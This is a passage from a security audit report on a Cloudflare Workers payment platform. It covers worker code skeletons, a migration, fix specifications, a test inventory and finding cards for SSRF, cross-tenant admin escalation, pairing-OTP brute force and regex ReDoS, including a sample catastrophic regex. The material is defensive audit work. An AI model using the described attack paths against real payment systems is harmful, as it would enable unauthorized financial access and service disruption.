  if (!row || row.status !== 'active' || row.mstatus !== 'active') throw new RpcAuthError({ code: 'AUTH_REQUIRED' });
  if (row.expires_at && new Date(row.expires_at) < new Date()) throw new RpcAuthError({ code: 'AUTH_REQUIRED' });
  const scopes = JSON.parse(row.scopes || '[]') as string[];
  if (need === 'platform') {
    if (!scopes.includes('*') || row.is_platform !== 1) throw new RpcAuthError({ code: 'PLATFORM_ONLY' });
  } else if (!(scopes.includes('*') || scopes.includes(need))) {
    throw new RpcAuthError({ code: 'SCOPE_DENIED', need });
  }
  if (ctx.merchantId != null && ctx.merchantId !== row.merchant_id) {
    throw new RpcAuthError({ code: 'AUTH_REQUIRED' });                  // tenant binding
  }
  return { merchantId: row.merchant_id };
}
```

## G.4 `workers/edgepay-customer/src/index.ts` (full skeleton)

```ts
import { Hono } from 'hono';
import { html } from './render';                       // template (assets + nonce)
import { hmacSha256 } from '@edgepay/shared/lib/crypto';
import type { CoreRpc, CallerContext } from '@edgepay/core-rpc';

type Env = {
  CORE: Service<CoreRpc>;
  WORKER_AUTH_SECRET: string;   // = core's WORKER_AUTH_SECRET_CUSTOMER
  ASSETS: Fetcher;
};

const app = new Hono<{ Bindings: Env }>();

async function ctxFor(c: any): Promise<CallerContext> {
  const base = { interfaceVersion: 1, worker: 'customer' as const,
                 merchantId: c.get('merchantId') ?? null, subject: null,
                 scopes: [], requestId: c.get('requestId') };
  const sig = await hmacSha256(JSON.stringify([base.interfaceVersion, base.worker,
    base.merchantId, base.subject, base.scopes, base.requestId]), c.env.WORKER_AUTH_SECRET);
  return { ...base, sig };
}

app.get('/checkout/:token', async (c) => {
  const view = await c.env.CORE.getCheckoutView(c.req.param('token'));
  return c.html(html(view, nonceFor(c)));              // static script asset + nonce CSP
});
app.post('/checkout/:token/initiate', async (c) =>
  c.json(await c.env.CORE.initiateGatewayPayment(c.req.param('token'), (await c.req.json()).gateway_id)));
app.post('/checkout/:token/verify', async (c) => {
  const b = await c.req.json();
  return c.json(await c.env.CORE.submitTrxForVerification(c.req.param('token'), b.trx_id, b.sender_phone ?? null));
});
app.get('/checkout/:token/callback', async (c) => {
  const params = Object.fromEntries(new URL(c.req.url).searchParams);
  const r = await c.env.CORE.handleGatewayCallback(c.req.param('token'), params);
  return c.redirect(`/checkout/${c.req.param('token')}/status`);
});
app.get('/checkout/:token/status', async (c) => c.json(await c.env.CORE.pollCheckoutStatus(c.req.param('token'))));

export default { fetch: app.fetch } satisfies ExportedHandler<Env>;
```

## G.5 `workers/edgepay-merchant/src/index.ts` (reduced REST, auth via core)

```ts
import { Hono } from 'hono';
import { zValidator } from '@hono/zod-validator';
import { createPaymentSchema, createRefundSchema } from '@edgepay/shared/lib/validation';
import { hmacSha256 } from '@edgepay/shared/lib/crypto';
import type { CoreRpc, CallerContext } from '@edgepay/core-rpc';

type Env = { CORE: Service<CoreRpc>; WORKER_AUTH_SECRET: string };

const app = new Hono<{ Bindings: Env }>();

app.post('*', async (c, next) => { /* authorizeKey RPC + requireScope('write') */ await next(); });

app.post('/v1/payments', zValidator('json', createPaymentSchema), async (c) => {
  const principal = c.get('principal');               // from authorizeKey
  const view = await c.env.CORE.createPayment({
    ctx: await signedCtx(c, principal),
    amount: c.req.valid('json').amount, /* ... */
  });
  return c.json({ success: true, data: view }, 201);
});

app.post('/v1/refunds', zValidator('json', createRefundSchema), async (c) => {
  const key = c.req.header('X-Idempotency-Key') ?? '';
  if (!key) return c.json({ success: false, error: { code: 'IDEMPOTENCY_KEY_REQUIRED' } }, 400);
  const view = await c.env.CORE.createRefund({ ctx: await signedCtx(c, c.get('principal')),
    transaction_id: c.req.valid('json').transaction_id,
    amount: c.req.valid('json').amount, idempotencyKey: key });
  return c.json({ success: true, data: view }, 201);
});
/* GET /v1/payments/:id, /v1/transactions, /v1/transactions/:trx, /v1/gateways,
   /v1/webhooks CRUD, /v1/health, docs — thin RPC adapters, ~15 handlers total */
export default { fetch: app.fetch } satisfies ExportedHandler<Env>;
```

## G.6 Migration 0005 (reservation + install lock)

```sql
-- 0005_rpc_split.sql
ALTER TABLE op_idempotency_keys ADD COLUMN status TEXT NOT NULL DEFAULT 'done'
  CHECK (status IN ('in_flight','done'));
CREATE INDEX idx_idem_inflight ON op_idempotency_keys(status, created_at);

CREATE TABLE op_install_lock (
  id INTEGER PRIMARY KEY CHECK (id = 1),
  installed_at TEXT NOT NULL,
  version TEXT NOT NULL
);  -- D1-backed install lock: KV flags become advisory only

ALTER TABLE op_device_pairing_tokens ADD COLUMN attempts INTEGER NOT NULL DEFAULT 0;
```

## G.7 Deploy order per release (the skew rule)

```text
1. deploy edgepay-core        (new RPC methods, dual-accept versions)
2. deploy edgepay-customer    (may call new methods)
3. deploy edgepay-merchant
4. deploy edgepay-admin
Rollback is reverse order; core keeps N-1 method acceptance for one release.
CI gate: a check script imports CoreRpc from both core and each frontend's
node_modules and asserts identical types (package pinned by workspace).
```

---

# ANNEX H — SERVICE BINDING COMPARISON: COST & LATENCY MODEL

## H.1 Cost model (Cloudflare list pricing, 2026)

| Mechanism | Per-call cost | Notes |
|---|---|---|
| Worker RPC via binding | **$0** (not a request; counts as subrequest, 1000/invocation paid plan) | zero egress, zero requests |
| fetch() via binding | **$0** (same — binding fetches don't bill the target worker) | framing overhead only |
| Public HTTP worker→worker | target billed as a request (~$0.30/M paid) + public bandwidth rules | also needs auth invention |
| DO RPC | billed as DO request (~$0.15/M after free) + duration | only for state access |
| Gateway product | per-gateway feature pricing | orthogonal |

At 3.3K payments/day (the README's free-tier ceiling) the split costs **nothing extra**; at 1M req/day the split *saves* the double-billing that public inter-worker HTTP would incur (~$0.60/day avoided) — modest, but the isolation is the real return.

## H.2 Latency model

```text
RPC hop (same PoC, in-process boundary):   ~0.1–0.5 ms   (structured clone of small ctx)
binding fetch (same PoC):                  ~1–3 ms       (HTTP framing)
public HTTP (same PoC):                    ~5–15 ms      (TLS reuse) 
public HTTP cross-PoC:                     ~15–60 ms
Smart Placement: core placed near D1; frontends placed at eyeball edge →
frontend→core hop may cross PoCs (~10-30ms) — acceptable: 1 hop per request,
vs. today's 3-6 sequential D1 round trips per request (D1 ~1-10ms each) which
dominate anyway. Measured end-to-end impact estimate: +5-15ms p50, +20ms p99
per API call — bounded and dominated by existing D1 latency.
Mitigation if needed later: colocate merchant+core (both Smart-Placed near
D1) and keep only the customer worker at the eyeball edge.
```

## H.3 Operational runbook deltas per worker

| Task | Monolith today | Four workers |
|---|---|---|
| Deploy checkout CSS | full redeploy (ledger ships) | customer only |
| Rotate gateway creds | secret put, full redeploy | core only |
| Add admin dashboard page | full redeploy | admin only |
| Rollback a bad release | one rollback (all-or-nothing) | per-worker rollback + route flip |
| Tail logs | one stream | per-worker streams + requestId correlation |
| D1 migrations | deploy script | core only (frontends cannot touch D1) |
| Access policy change | dashboard + middleware | dashboard (worker-agnostic) |

---

# ANNEX I — FIX SPECIFICATIONS FOR ALL OPEN P2/P3 FINDINGS

One-line-to-one-block specs so Phase B is checklist-driven:

| ID | Spec |
|---|---|
| P2-001 | `git rm src/middleware/csrf.ts`; drop csrfToken from AppVariables (or mount on future cookie routes) |
| P2-003 | reconciliation.ts:168 → remove `AND is_platform = 0` |
| P2-004 | webhooks.ts:76 → drop `ORDER BY m.is_platform DESC`; no merchant context → 400 NOT_MERCHANT_CONTEXT |
| P2-005 | rate-limit.ts: writes without binding → 429 after 10 un-metered requests (bounded fail-closed) + page() |
| P2-006 | wrangler.jsonc: uncomment analytics_engine_datasets; deploy runbook step "verify metric() in Workers Analytics" |
| P2-007 | op_webhook_outbox (id, merchant_id, event, payload, status, created_at); written in completeTransaction's D1 batch; hourly cron drains → queue, marks sent |
| P2-008 | ledger-audit.ts: NOT EXISTS gains ordinal: entries carry `ordinal` (index) and predicate adds `AND le.ordinal = ?` (migration adds column) |
| P2-009 | crypto.ts decrypt: on AUTH_FAILED throw DecryptError; callers: page('ENCRYPTION_KEY_MISMATCH') once per isolate |
| P2-010 | envelope v2: `v2.{key_id}.{iv}.{ct}.{tag}`; decrypt tries v2 then legacy; rotation runbook: add new key, dual-decrypt, re-encrypt lazily |
| P2-011 | cloudflare-access.ts: timingSafeEqual for bg pair; `AbortSignal.timeout(5000)` on JWKS fetch |
| P2-012 | ledger-do.ts postInner entry: `if (payload.merchant_id !== this.merchantId) return failed MERCHANT_MISMATCH` (store merchantId at construction from ctx.idFromName) |
| P2-013 | migration: `CREATE UNIQUE INDEX uq_api_keys_prefix ON op_api_keys(key_prefix)`; on conflict regenerate prefix (loop ×3) |
| P2-014 | middleware body-cap: content-length > 128KB → 413; mobile batch: `messages.length > 100 → 400`; offset: `Math.max(0, …)` |
| P2-015 | sms-parser: pattern length ≤ 512; reject nested quantifiers via quick regex-lint (safe-regex port); parse under `Promise.race` with 200ms budget |
| P2-016 | platform.ts: `ENVIRONMENT === 'production' && !ENABLED_GATEWAYS` → throw at config resolution (fail deploy-fast) |
| P2-017 | crypto.ts: document 50K; production floor 100K (env min raised); comment fixed |
| P2-018 | validation.ts moneySchema `.refine(n => n > 0 && n <= 90_000_000)` |
| P2-019 | lib/money: `exponentFor(currency)` (ISO-4217 table; default 2); buildPayload threads it into moneyToMinorStrict(amount, exp) |
| P2-020 | cron: AbortSignal.timeout(10s); rates filtered `Number.isFinite && 0 < r < 1000`; timestamp guard |
| P3-001 | types/db.ts: drop dead states from union; migration tightens CHECK (or implement them) |
| P3-002 | auth.ts requireJwtAuth: `c.set('authSubject', payload.device_id)`; sub stays `authUserId` |
| P3-003 | mobile.ts ack: `AND merchant_id = ? AND device_id = ?` |
| P3-004 | mobile.ts: use insertResult.meta.last_row_id |
| P3-005 | maintenance.ts: escapeHtml(info.reason) |
| P3-006 | server.js: `server.listen(PORT, '127.0.0.1')`; /api/forward: require X-Dev-Token, block private IPs |
| P3-007 | hmacSha256(message, secret, encoding: 'raw'|'base64'); call sites pin |
| P3-008 | webhook-consumer: payload_hash = sha256(jsonPayload) |
| P3-009 | terminal = [400,401,403,404,410,422]; retry = [408,429,>=500] |
| P3-011 | sms-consumer: write extraction only when parser !== 'none' |
| P3-012 | CI step: regenerate TEST_RESULTS.md counts; docs-claim lint greps comments vs constants |

---

# ANNEX J — TEST INVENTORY & GAP MAP

| File | Tests | Quality | Gaps it should absorb (from §29) |
|---|---|---|---|
| ledger-do.test.ts | 13 | exemplary (crash injection) | P2-008 ordinal, P2-012 mismatch |
| ledger-consistency.test.ts | 4 | exemplary (property + faults) | platform merchant inclusion |
| payment-integrity.test.ts | 11 | strong | concurrent economic-effect, over-refund, read-only mutations, ceiling |
| payment-edgecases.test.ts | 4 | good | ceiling case |
| tenant-routing.test.ts | 8 | good | admin platform gate, notification ack |
| access-jwt.test.ts | 9 | exemplary | break-glass timing, JWKS timeout |
| api-middleware.test.ts | 9 | good | body caps, scope defaults |
| sms-corroboration-edgecases.test.ts | 9 | strong | — |
| sms-parser-adversarial.test.ts | 9 | strong | ReDoS pattern rejection |
| runtime-integrity.test.ts | 4 | good | KV root-key absence |
| workflow-policy.test.ts | 6 | good (pure) | — |
| money / jwt / smoke / gateways / catalog / port-kit / bd-gateways / gateway-integrity / gateways-enabled / api-reference | ~126 | solid | SSRF vector table (gateways-enabled pattern) |
| **Total** | **212** | | **+17 required (§29)** |

---

# ANNEX K — PAYMENT LIFECYCLE WALKTHROUGH (HAPPY PATH, EVERY HOP)

```text
1.  Merchant backend → POST /api/v1/payments (Bearer key, X-Idempotency-Key)
2.  rateLimitMiddleware (per-key read/write binding)
3.  idempotencyMiddleware (lookup (merchant,key); hash body)
4.  zValidator (createPaymentSchema)
5.  PaymentService.createIntent
      ├─ (opt) auto-seed manual gateway [UNIQUE race → 500]
      ├─ INSERT op_payment_intents (status pending, token=random, expires_at)
      └─ INSERT op_transactions (status pending, fee 0, net=amount)
6.  Response 201 { intent_id, token, checkout_url }
7.  Customer → GET /checkout/{token}
      domainMiddleware resolves merchant (Host)
      CSP headers mounted; render (escaped, brandColor sanitized)
8.  Customer picks gateway → POST /checkout/{token}/initiate
      PaymentService.initiatePayment → adapter.initiate (gwFetch, 15s)
      → redirect URL / manual instructions
9.  Customer pays (MFS app / gateway page)
10. Provider → GET /checkout/{token}/callback?paymentID=…&val_id=…
      handleCallback:
        intent+tx lookup (token) → adapter.verify (gwFetch) →
        [amount cmp (conditional)] [trx_id cmp (dead for BD)] →
        completeTransaction
11. completeTransaction (THE money moment):
        postPaymentLedgerEntry (fee-aware double entry)
          LedgerService.post → buildPayload (moneyToMinorStrict)
          → LedgerDO.postTransaction (blockConcurrencyWhile)
              A shape validate → B tx_id dedup (m{m}:payment:{intent})
              C balance guard → D op_ledger_postings pending (WAL)
              E DO journal+balances → F audit batch + postings→posted
        D1 batch: tx→completed, intent→completed
        WebhookDispatcher.dispatch → WEBHOOK_QUEUE.sendBatch
12. Queue consumer → POST merchant webhook (HMAC, 15s, retries 60/300/1800s, DLQ)
13. Merchant backend verifies X-EdgePay-Signature → order fulfilled
14. (Parallel) carrier SMS → merchant phone → POST /api/mobile/v1/sms
        → SMS_QUEUE → sms-consumer → parse (regex/AI) →
        corroborate (amount cmp, currency, customer_trx_id, sender gateway)
        → confirm → completeTransaction (converges via tx_id dedup)
15. Hourly cron: replayPendingPostings (fast-heal) + exchange rates + domain reverify
16. Daily sweep workflow: full consistency verify (DO vs D1 mirror) +
    stuck-refund re-drive + run audit row
Refund: POST /api/v1/refunds → RefundService (bounds) → op_refunds pending →
workflow refund-{id} → poll gateway (52×) → postRefundLedgerEntry
(m{m}:refund:{publicId}) → webhook refund.completed → status completed.
```

---

# ANNEX L — SEVERITY METHODOLOGY, CONFIDENCE & GLOSSARY

**Severity model** (brief §41, applied consistently): P0 = money loss/double-spend/ledger corruption/cross-tenant financial access/authn bypass/admin compromise/secret compromise with material impact/irrecoverable inconsistency. P1 = serious authz issues, significant disclosure, integrity degradation, persistent unrecoverable state, serious abuse. P2 = defense-in-depth, availability, operational, limited exposure. P3 = hardening/maintainability/docs. Every P0/P1 verdict in this report carries a concrete path (Part II evidence; Annex B reproductions).

**Confidence legend:** findings verified by direct code trace + test execution = **HIGH**; code trace only = **MEDIUM** (noted where runtime confirmation was not possible in the sandbox); docs-claim verifications = traced to code (never accepted at face value).

**Verdict vocabulary** (implemented / configured / tested / observed / documented / claimed — brief §40): this report treats *implemented* (code exists in the request path) and *tested* (pinned by a test) as the only evidence classes sufficient for PASS verdicts. Configured-but-inert (Analytics), implemented-but-unmounted (CSRF, otp/password limiters), and documented-but-absent (four-worker topology) are explicitly distinguished and counted as findings.

**Glossary:** DO = Durable Object; WAL = write-ahead log (op_ledger_postings); RPC = Worker-to-Worker typed call over a Service Binding; MFS = mobile financial services (bKash/Nagad/Rocket); posting protocol = steps A–F in §17.1; reservation = pre-insert idempotency row with lease; claim flow = single-use token that reveals credentials once; platform merchant = the is_platform=1 operator tenant; Smart Placement = Cloudflare worker placement near backing services.

# ANNEX M — FULL FINDING CARDS FOR CARRIED-FORWARD FINDINGS (brief §42 format)

The previous findings that remain open, restated in the brief's exact finding format against the v0.3.0 code, so each can be tracked as a first-class ticket. (P0/P1 cards appear in Part II §5-6 and Annex B/C; this annex formalizes the remaining open items that materially matter — the 10 highest-impact P2s and the 3 open P1s in ticket form.)

---

## M.1 EDGE-P1-004 (carried) — Outbound webhook SSRF

```text
ID: EDGE-P1-004
Severity: P1
Category: SSRF / Network Security
File: src/queues/webhook-consumer.ts
Function / Lines: isAllowedWebhookUrl() / 119-166; processOne / 49-59

Title: Merchant-configurable webhook URLs can target internal/private
       services through 10+ canonicalization bypasses

Threat / Failure Scenario:
    A merchant (or an attacker holding even a READ-ONLY key — P1-008
    compounds this) registers a webhook URL whose hostname encodes a
    private/loopback target in a form the string-matching filter does
    not recognize. Payment completion triggers the queue consumer to
    fetch() it (redirect-following on). The consumer POSTs a signed
    payload — including merchant/payment metadata — to an internal
    endpoint, and returns nothing, but the request itself is the attack
    (internal service enumeration, Cloudflare-metadata-style endpoints,
    internal APIs that accept unauthenticated POSTs).

Root Cause:
    Validation operates on the hostname STRING, not on the IP the
    hostname resolves to, and not on the post-redirect target.

Existing Guard:
    HTTPS-only; string blocklist of private IPv4 forms, ::1, 0.0.0.0,
    .local/.internal/.localhost suffixes; 15s timeout.

Why the Guard Is / Is Not Sufficient:
    The blocked set is the *literal* form of the private space. Every
    non-literal encoding (integer/hex/octal IPv4, IPv6 ULA/link-local,
    IPv4-mapped IPv6, mixed forms), every DNS-rebinding name, and every
    redirect chain is unblocked. A filter that blocks the examples an
    author thought of is not a filter.

Impact:
    Internal network probing from a trusted egress; data exfiltration
    channel (payload contents delivered to attacker-chosen targets);
    potential interaction with unauthenticated internal endpoints.

Exploitability:
    High — registration is one API call; verification of success is
    observable via the delivery log (status codes are recorded).

Evidence:
    Annex B.4 vector table; webhook-consumer.ts:49 fetch with default
    redirect:'follow'; api.ts:320 webhook registration without write
    scope.

Recommended Fix:
    C.4 (url-guard with canonicalization + redirect:'error') and write
    scope on registration (C.3). Long-term: resolve-and-pin at
    registration; egress worker.

Regression Test:
    Table-driven unit test over Annex B.4 vectors → all rejected;
    integration: registered webhook to redirector → delivery blocked.

Migration Required: No.
Verdict: FAIL
```

---

## M.2 EDGE-P1-005 (carried) — Cross-tenant admin escalation

```text
ID: EDGE-P1-005
Severity: P1 (P0-equivalent in multi-tenant deployments)
Category: Authorization / Privilege Escalation
File: src/controllers/admin-api.ts
Function / Lines: GET /merchants 247-255; POST /merchants 256-394
                 (compound: cloudflare-access.ts:284-329 bearer path)

Title: Any admin-scoped merchant key enumerates all tenants and
       provisions new ones, harvesting their root credentials

Threat / Failure Scenario:
    Merchant A's admin key → POST /api/admin/v1/merchants → 201 response
    contains the new tenant's api_key (read,write,admin,*), pairing_otp
    (30-day device pairing), webhook_secret. Attacker now owns tenant B
    outright: reads its transactions, refunds its payments, receives its
    webhooks, pairs its SMS device. Enumeration (GET /merchants) maps the
    whole platform. The Cloudflare Access gate in front does not stop
    this: its bearer pass-through accepts admin-scoped keys by design.

Root Cause:
    Privilege is modeled as a SCOPE (admin) with no TENANT-CLASS check
    (platform vs merchant). The scope grants platform-wide powers to
    merchant-level principals.

Existing Guard:
    accessAuthMiddleware (Access JWT or bearer admin key) +
    requireScope('admin').

Why the Guard Is / Is Not Sufficient:
    Both guards check *that* you are an admin, not *whose* admin you
    are. Tenant class is never consulted.

Impact:
    Full cross-tenant financial access; platform tenant farming.

Exploitability:
    Trivial (Annex B.2, two curl calls).

Recommended Fix:
    C.2 (platform gate + is_platform check + claim-flow credential
    delivery). Structural fix lands with the §13 split ('platform'
    scope enforced core-side).

Regression Test:
    Non-platform admin key → GET/POST merchants → 403 PLATFORM_ONLY.

Migration Required: No.
Verdict: FAIL
```

---

## M.3 EDGE-P1-002 (carried) — Pairing OTP brute force

```text
ID: EDGE-P1-002
Severity: P1
Category: Authentication / Brute Force
File: src/controllers/mobile.ts (handlePairing 19-96); src/index.ts:185

Title: 6-digit, 30-day pairing token with no rate limit, lockout, or
       attempt counting

Threat / Failure Scenario:
    /api/mobile/v1/pair accepts unlimited OTP guesses per IP. The
    paired device receives and relays every merchant SMS — including
    payment confirmations with amounts and TrxIDs — and can submit
    them (corroboration-authorized completions). Brute-forcing a
    pairing is therefore a merchant-SMS-integrity compromise.

Root Cause:
    The 'otp' limiter group (10/hour) was written but never mounted;
    no per-token attempt counter exists.

Existing Guard: format check only (6 digits).

Why the Guard Is / Is Not Sufficient:
    A 1e6 keyspace with unlimited attempts is not a guard.

Impact: merchant SMS stream compromise; corroboration-path integrity.

Exploitability: High (Annex B.3).

Recommended Fix: C.1 (mount groups + attempts column with 5-strike
revocation + shorter token TTL).

Regression Test: 6th guess → 429; 6th wrong guess for one token → 410.

Verdict: FAIL
```

---

## M.4 EDGE-P2-007 (carried) — Missing webhook outbox

```text
ID: EDGE-P2-007   Severity: P2   Category: Reliability / Data Integrity
File: src/services/payment.ts:421-434 (dispatch after batch commit)

Threat: isolate eviction between the completion D1 batch and
WEBHOOK_QUEUE.sendBatch loses the merchant notification permanently —
the payment completed, the ledger posted, and the merchant never hears
about it (no retry path exists for a send that never happened).
Fix: op_webhook_outbox row in the same batch; hourly drain cron
(deliver → mark sent); idempotency key on deliveries (also closes the
P1-004 delivery component).
Regression: kill the worker between batch and send (the vitest-plugin
fault seams already support this pattern for the ledger); sweep
delivers exactly once.
Verdict: FAIL
```

## M.5 EDGE-P2-009/010 (carried) — Key management posture

```text
ID: EDGE-P2-009 + P2-010   Severity: P2 ×2   Category: Cryptography
Files: src/lib/crypto.ts:41-95; every decrypt caller

Threat: (a) a rotated or typo'd ENCRYPTION_KEY silently yields empty
credentials (catch+skip at 6 call sites) → all gateway calls fail with
provider auth errors while the real cause is invisible; (b) there is
no key version, so rotation requires a big-bang re-encrypt with the
platform down (dual-key window impossible).
Fix: envelope versioning + DecryptError page() (I.9/I.10); rotation
runbook in docs/SECURITY.md.
Verdict: FAIL (posture)
```

## M.6 EDGE-P2-012 (carried) — LedgerDO self-check

```text
ID: EDGE-P2-012   Severity: P2   Category: Defense-in-Depth
File: src/do/ledger-do.ts:112-160

Threat: the DO trusts payload.merchant_id for its D1 WAL and mirror
writes without asserting it matches the DO's own identity (from
idFromName('merchant-{id}')). Today the only caller constructs both
consistently; any future internal bug (wrong stub resolution, refactored
service) silently cross-posts to another tenant's book with no DO-side
rejection. The ledger is the one component where a two-line guard buys
permanent structural safety.
Fix: store merchantId in the constructor (parse from ctx.idFromName
contract — pass it via LedgerService); postInner first line:
if (payload.merchant_id !== this.merchantId) return failed
MERCHANT_MISMATCH.
Verdict: FAIL (cheap fix, high structural value)
```

## M.7 EDGE-P2-014 (carried) — Unbounded inputs

```text
ID: EDGE-P2-014   Severity: P2   Category: Input Validation / DoS
Files: webhooks.ts:131 (req.text()), api.ts (json), mobile.ts:197 (batch array)

Threat: oversized webhook bodies burn CPU+D1 before signature rejection
(the failure-delivery INSERT fires); oversized mobile sms/batch arrays
mint D1 rows + queue sends linearly with array size; one request can
write hundreds of rows.
Fix: content-length pre-check (413 over 128KB), batch array cap (100),
offset clamping.
Verdict: FAIL
```

## M.8 EDGE-P2-015 (carried) — SMS regex ReDoS

```text
ID: EDGE-P2-015   Severity: P2   Category: Denial of Service
File: src/services/sms-parser.ts:183; admin-api.ts:84 (PUT sms-templates)

Threat: a merchant admin saves a catastrophic-backtracking regex
("(a+)+$"); every subsequent SMS for that merchant burns CPU until the
worker's 30s budget (10ms free tier → immediate 1102) — the SMS
pipeline for that tenant freezes, payments await verification forever.
Fix: pattern lint (reject nested unbounded quantifiers), length cap
512, and a 200ms race-budget around the match.
Verdict: FAIL
```

## M.9 EDGE-P2-018/019 (carried) — Money boundary hygiene

```text
ID: EDGE-P2-018 + P2-019   Severity: P2 ×2   Category: Money / Decimal Safety
Files: src/lib/validation.ts:20-22; src/lib/money.ts:89; ledger.ts buildPayload

Threat (018): a >90M intent passes the API, renders a checkout, and can
never settle (DO MAX_AMOUNT_MINOR rejects at posting) — a customer-facing
dead checkout and a stuck pending intent.
Threat (019): enabling any non-2-exponent currency (JPY, BHD...) scales
every posting by the wrong power of ten — books systematically wrong by
10-1000x for that currency.
Fix: schema ceiling refine (C.6) + exponentFor(currency) table threaded
through moneyToMinorStrict.
Verdict: FAIL (latent)
```

## M.10 EDGE-P2-011 (carried) — Access hardening details

```text
ID: EDGE-P2-011   Severity: P2   Category: Authentication Hardening
File: src/middleware/cloudflare-access.ts:336-364 (break-glass), 244-263 (JWKS)

Threat: (a) break-glass secrets compared with === — a remote timing
oracle against a credential pair that grants full admin access;
(b) JWKS fetch has no timeout — a stalled fetch holds admin requests
until the platform limit, turning an IdP hiccup into a slow outage
(fail-closed eventually, slowly).
Fix: timingSafeEqual both fields; AbortSignal.timeout(5000) + cache
negative results for 60s.
Verdict: FAIL
```

## M.11 EDGE-P2-006 (carried) — Observability off switch

```text
ID: EDGE-P2-006   Severity: P2   Category: Observability / Operations
File: wrangler.jsonc:239-241 (commented binding)

Threat: the system's entire alarm design — rate_limit_degraded,
webhook_signature_rejected, sms_parse_miss, LEDGER_RECONCILIATION_DRIFT,
REFUND_STUCK pages — emits through metric()/page() which no-op without
the ANALYTICS binding. Production today is blind to exactly the signals
the failure-mode analysis depends on. page() also console.logs (Workers
Logs retain it), which is the only live channel.
Fix: uncomment the binding (15 min); add a boot-time self-check that
pages/logs METRICS_INERT when env.ANALYTICS is absent in production.
Verdict: FAIL (operational readiness)
```

## M.12 EDGE-P2-013 (carried) — key_prefix uniqueness

```text
ID: EDGE-P2-013   Severity: P2   Category: Data Model
File: migrations/0001_initial_schema.sql:112-122

Threat: 12-hex prefixes are random but not unique-constrained; a
collision (probability non-trivial across admin-minted keys) makes the
prefix lookup fetch the wrong row: the honest key gets 401 (availability
loss, hard to diagnose), and prefix-scoped analytics conflate keys.
Fix: unique index + regenerate-on-conflict loop at every issuance site
(4 sites: install, bootstrap-key, admin provision, api-keys).
Verdict: FAIL
```

---

# ANNEX N — TOPOLOGY OPTION DIAGRAMS (§15.2 VISUALIZED)

## N.1 Option A — Service Bindings + Worker RPC (recommended)

```text
 Internet                frontends (no data bindings)          core (all data bindings)
 ────────                ───────────────────────────          ────────────────────────
 pay.brand.com ─────▶ ┌─────────────────────┐
                      │ edgepay-customer    │═══RPC═══════════▶ ┌──────────────────┐
 api.edgepay.com ───▶ │ (checkout only)     │  typed, private   │ edgepay-core     │
                      ├─────────────────────┤  no public route  │ D1 KV R2 DO Q WF │
                      │ edgepay-merchant    │═══RPC═══════════▶ │ gateways, cron   │
 admin.edgepay.io ──▶ │ (REST 13 routes)    │                   │ /webhook/:gw only│
 [CF Access]          ├─────────────────────┤                   └──────────────────┘
                      │ edgepay-admin       │═══RPC(platform)══▶      ▲
                      │ (Access-gated)      │                          │ provider webhooks
                      └─────────────────────┘                          │
                                        providers ────────────────────┘
 Legend: ══▶ service binding (account-private, subrequest, $0 request cost)
```

## N.2 Option B — Service Bindings + fetch()

```text
 frontends ──fetch(binding)──▶ core routes /internal/* (JSON envelopes, custom
                               HMAC headers, status-code mapping, retry logic)
 Same isolation as A; loses typed calls, gains Request/Response streaming.
 Use as a complement for payload-shaped ops (uploads, openapi.json).
```

## N.3 Option C — Public inter-worker HTTP

```text
 frontends ──HTTPS(public)──▶ core.example.com/api/internal/* (must exist on
                              public DNS; auth = shared secrets; TLS + egress
                              billed; core invocations billed as requests)
 ⚠ reintroduces exactly the public attack surface the split removes.
```

## N.4 Option D — Monolith + tightened middleware (status quo)

```text
 Internet ──▶ [ONE WORKER: all routes, all bindings, all privileges]
 The current architecture. Middleware gates are the only boundaries —
 and this audit's carried findings (P1-005/008, P0-001 blast radius)
 are the empirical result.
```

## N.5 Option E — DO-as-core

```text
 frontends ──DO RPC──▶ per-tenant DOs (state + request serving)
 ⚠ input gates serialize per-tenant; cross-tenant ops need fan-out;
 billing per DO request; wrong decomposition axis (state ≠ service).
```

## N.6 Option F — API Gateway layer

```text
 Internet ──▶ [CF Gateway/WAF: per-route limits, keys] ──▶ frontends ──▶ ...
 Complements A (edge policy), provides no frontend↔core trust boundary.
```

---

# ANNEX O — ARCHITECTURE DECISION RECORDS (ADR)

## ADR-001 — Decompose the monolith into four workers

**Status:** recommended (Phase C). **Context:** single isolate holds all privileges (§11); carried findings demonstrate the blast radius (P0-001, P1-005). **Decision:** customer/merchant/admin frontend workers + core; only core holds data-plane bindings. **Alternatives:** status quo (D — rejected: empirical findings); public HTTP (C — rejected: re-exposes surface); DO-as-core (E — rejected: wrong axis). **Consequences:** +4 deploys, +1 shared package, RPC interface versioning discipline; − blast radius, − deploy coupling, − public route count (67→~21). **Reversibility:** route flips at every phase (§13.8).

## ADR-002 — Worker RPC as the inter-worker mechanism

**Status:** recommended. **Context:** §15 comparison. **Decision:** typed RPC via service bindings for operations; fetch-through-binding for payload-shaped calls; per-worker HMAC caller auth; core-side re-authorization (G6). **Alternatives:** B (fallback/complement), C (rejected), E (rejected), F (complement). **Consequences:** compile-time interface checks both sides; subsecond latency; no per-call billing; interface version field for deploy skew; no streaming over RPC (hence the fetch complement).

## ADR-003 — Reduce public API to customer-facing REST

**Status:** recommended (Phase C). **Decision:** 13 merchant routes + 7 checkout routes + provider webhook + health/docs; everything else RPC/admin-worker. **Rejected alternative:** keep all 67 routes and add per-route policies — the carried scope-gap findings (P1-008) show per-route policy decays; router-level defaults (`POST* → write`) structurally prevent it. **Consequences:** clean OpenAPI v1; dashboard features consume RPC; deprecation release for old /api/v1.

## ADR-004 — Authentication in the split

**Decision:** Option B of §13.6 — frontends call `CORE.authorizeKey(prefix, hash)`; per-isolate LRU (60s); core re-authorizes every mutation. **Consequences:** zero DB bindings in frontends; ~1ms amortized auth; one implementation of key logic; future: core-issued short-lived worker JWTs (Option C) if the LRU miss rate matters.

## ADR-005 — Idempotency reservation (fix-in-flight)

**Decision:** pre-insert `in_flight` rows with 30s lease; 409 for concurrent same-key; sweep clears dead leases. **Rationale:** the P1-001 race is the last exactly-once gap in the payment path; the reservation pattern is the standard remedy and lands with core-side idempotency during the split. **Consequences:** +1 migration column; retry semantics documented (clients treat 409 as "await and retry GET").

## ADR-006 — Webhook delivery outbox

**Decision:** D1 outbox written atomically with completion; hourly drain; delivery idempotency key header. **Rationale:** closes P2-007 (lost notifications) and the delivery half of P1-004 (duplicate deliveries). **Consequences:** +1 table/cron; merchant-side dedup by X-Idempotency-Key becomes reliable.

---

# ANNEX P — `wrangler.jsonc` LINE-REFERENCED COMMENTARY

```text
L25  compatibility_date 2026-08-28 — current; matches test workerd; keep
     bumping with devDependencies (comment explains)              OK
L26  nodejs_compat flag — forward-safe (v2 default-on ≥2026-08-04)  OK
